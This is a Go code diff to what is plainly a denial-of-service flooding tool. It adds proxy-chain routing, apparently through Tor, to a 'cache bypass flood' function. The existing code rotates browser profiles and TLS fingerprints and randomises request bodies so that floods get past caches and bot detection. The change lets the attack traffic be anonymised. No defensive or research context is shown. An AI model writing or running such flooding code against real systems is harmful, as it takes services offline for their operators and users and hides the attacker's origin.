@@ -93,7 +93,7 @@ func runCacheBypassFlood(cfg *AttackConfig) {
 				endpoint := endpoints[endpointIdx%len(endpoints)]
 				endpointIdx++
 
-				err := cacheBypassRequest(host, port, hostHeader, endpoint, useTLS)
+				err := cacheBypassRequest(host, port, hostHeader, endpoint, useTLS, cfg.ProxyChain)
 				atomic.AddInt64(&metrics.TotalRequests, 1)
 				if err != nil {
 					atomic.AddInt64(&metrics.Failed, 1)
@@ -110,12 +110,22 @@ func runCacheBypassFlood(cfg *AttackConfig) {
 	metricsMu.Unlock()
 }
 
-func cacheBypassRequest(host, port, hostHeader, endpoint string, useTLS bool) error {
+func cacheBypassRequest(host, port, hostHeader, endpoint string, useTLS bool, proxyChain string) error {
 	// Rotate browser profile
 	profile := GetRandomProfile()
 	
-	dialer := &net.Dialer{Timeout: 6 * time.Second}
-	rawConn, err := dialer.Dial("tcp", host+":"+port)
+	// Use longer timeouts when routing through proxy chain (Tor adds latency)
+	dialTimeout := 6 * time.Second
+	tlsTimeout := 8 * time.Second
+	rwTimeout := 6 * time.Second
+	if proxyChain != "" || globalProxyChain != "" {
+		dialTimeout = 20 * time.Second
+		tlsTimeout = 25 * time.Second
+		rwTimeout = 20 * time.Second
+	}
+	
+	dial := createDialer(proxyChain, dialTimeout)
+	rawConn, err := dial("tcp", host+":"+port)
 	if err != nil {
 		return err
 	}
@@ -130,7 +140,7 @@ func cacheBypassRequest(host, port, hostHeader, endpoint string, useTLS bool) er
 		// Use browser-specific TLS fingerprint
 		tlsConfig := CreateTLSConfig(profile, hostHeader)
 		tlsConn := tls.Client(rawConn, tlsConfig)
-		tlsConn.SetDeadline(time.Now().Add(8 * time.Second))
+		tlsConn.SetDeadline(time.Now().Add(tlsTimeout))
 		if err := tlsConn.Handshake(); err != nil {
 			return err
 		}
@@ -138,7 +148,7 @@ func cacheBypassRequest(host, port, hostHeader, endpoint string, useTLS bool) er
 		defer tlsConn.Close()
 	}
 
-	conn.SetDeadline(time.Now().Add(6 * time.Second))
+	conn.SetDeadline(time.Now().Add(rwTimeout))
 
 	// Random body data - varies per request to bust any cache
 	bodySize := 100 + (int(time.Now().UnixNano()) % 500)
@@ -212,7 +222,11 @@ func cacheBypassRequest(host, port, hostHeader, endpoint string, useTLS bool) er
 
 	// Drain response so connection closes cleanly
 	buf := make([]byte, 4096)
-	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
+	readTimeout := 3 * time.Second
+	if proxyChain != "" || globalProxyChain != "" {
+		readTimeout = 15 * time.Second
+	}
+	conn.SetReadDeadline(time.Now().Add(readTimeout))
 	conn.Read(buf)
 
 	return nil
